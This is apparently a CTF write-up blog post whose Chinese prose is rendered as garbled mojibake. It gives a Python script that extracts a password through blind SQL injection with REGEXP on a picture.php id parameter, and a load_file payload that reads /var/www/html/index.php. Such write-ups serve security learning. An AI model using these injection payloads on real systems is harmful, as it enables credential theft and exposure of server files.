<p>è¿™é‡Œæœ‰ä¸¤ä¸ªåŠæ³•</p>
<h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><p><a href="https://www.cnpanda.net/ctf/731.html#menu_index_5" target="_blank" rel="noopener">æ¥æº</a></p>
<h4 id="æ­£åˆ™åŒ¹é…"><a href="#æ­£åˆ™åŒ¹é…" class="headerlink" title="æ­£åˆ™åŒ¹é…"></a>æ­£åˆ™åŒ¹é…</h4><p><a href="https://0xfire.me/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/" target="_blank" rel="noopener">æ¥æº</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">a =[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line">temp = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        url = <span class="string">'http://xxx.yunyansec.com/picture.php?id=3" or password REGEXP '</span>+<span class="string">'\'^'</span>+temp+i+<span class="string">'\' %23'</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'not found'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            temp = temp+i</span><br><span class="line">            <span class="keyword">print</span> (temp)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åçˆ†å‡ºç”¨æˆ·åå’Œå¯†ç åç™»é™†å°±å¥½äº†ã€‚</p>
<p>é¡ºä¾¿ï¼Œè¿™é¢˜æ˜¯<a href="https://github.com/XDSEC/xdsec_ctf/tree/494b53d388186e8be21e753bb2048362842280c1/xdctf2015/izyCTF" target="_blank" rel="noopener">åŸé¢˜</a>ã€‚ï¼ˆæ‰‹åŠ¨å¾®ç¬‘</p>
<h3 id="éé¢„æœŸè§£"><a href="#éé¢„æœŸè§£" class="headerlink" title="éé¢„æœŸè§£"></a>éé¢„æœŸè§£</h3><p>æˆ‘è¿˜çœ‹åˆ°äº†ä¸ªå¸ˆå‚…ç›´æ¥ç”¨ <code>load_file</code>è¯»æºç ï¼Œæœ‰ç‚¹nbã€‚æœ¬é¢˜ä½œè€…è®²ä»–è®²é™æƒäº†çš„ï¼Œæ‰€ä»¥æ‰èƒ½è¿™ä¹ˆç”¨ã€‚</p>
<p>å¹¶ä¸”è¿™ä¸ªè·¯å¾„ä¸å¤ªéš¾çŒœï¼Œæ ¹æ®ä»¥ä¸‹payloadå†™ä¸ªè„šæœ¬å°±è¯»å‡ºæ¥äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.159.170&#x2F;sql&#x2F;picture.php?id&#x3D;1&quot;^if(hex(load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;))&lt;&quot;40&quot;,1,0)%23</span><br></pre></td></tr></table></figure>













</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Neorah</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://neorah.me/Tstar/">https://neorah.me/Tstar/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" target="_blank" rel="noopener">CC BY-NC-SA 3.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="next-post pull-right"><a href="/ctf/%E6%9C%AA%E5%91%BD%E5%90%8D/"><span>ctf/æœªå‘½å</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(/img/top.JPG)"><div class="layout" id="footer"><div class="copyright">&copy;2020 By Neorah</div><div class="footer_custom_text">Theme By melody</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="/js/third-party/anime.min.js"></script><script src="/js/third-party/jquery.min.js"></script><script src="/js/third-party/jquery.fancybox.min.js"></script><script src="/js/third-party/velocity.min.js"></script><script src="/js/third-party/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/algolia.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="algolia-search"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>